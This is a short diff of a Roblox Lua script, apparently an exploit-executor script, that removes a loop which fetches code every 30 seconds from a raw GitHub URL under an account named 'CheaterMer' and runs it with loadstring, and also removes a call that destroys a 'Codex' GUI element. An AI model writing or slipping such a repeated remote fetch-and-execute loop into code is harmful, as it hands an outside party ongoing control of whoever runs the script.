@@ -5495,13 +5495,5 @@ plrs.PlayerRemoving:Connect(function(player)
 	--print("remove",player.Name)
 end)
 
-task.spawn(function()
-	while task.wait() do
-    	loadstring(game:HttpGet("https://raw.githubusercontent.com/CheaterMer/23wtrgsngj6eterejutekyhwsaeurt/main/bruhskull"))()
-        task.wait(30)
-    end
-end)
 
-spawn(function()
-	game:GetService("CoreGui").Codex:Destroy()
-end)
+
